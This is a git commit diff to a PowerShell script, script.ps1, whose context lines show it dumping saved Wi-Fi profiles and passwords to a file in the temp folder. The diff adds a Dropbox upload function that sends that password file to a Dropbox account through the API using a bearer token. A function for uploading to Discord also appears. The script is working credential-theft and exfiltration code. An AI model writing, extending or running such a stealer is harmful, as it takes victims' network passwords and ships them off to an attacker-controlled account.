cc8d7ab5b10fe413936c09127865f6b60266c62b
Towa <70810089+Towux@users.noreply.github.com>
2023-05-31 19:07:03 +0300

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -7,6 +7,32 @@ $wifiProfiles > $env:TEMP/--wifi-pass.txt
 
 ############################################################################################################################################################
 
+# Upload output file to Dropbox
+
+function DropBox-Upload {
+
+[CmdletBinding()]
+param (
+	
+[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
+[Alias("f")]
+[string]$SourceFilePath
+) 
+$outputFile = Split-Path $SourceFilePath -leaf
+$TargetFilePath="/$outputFile"
+$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+$authorization = "Bearer " + $db
+$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+$headers.Add("Authorization", $authorization)
+$headers.Add("Dropbox-API-Arg", $arg)
+$headers.Add("Content-Type", 'application/octet-stream')
+Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+}
+
+if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TEMP/--wifi-pass.txt}
+
+############################################################################################################################################################
+
 function Upload-Discord {
 
 [CmdletBinding()]
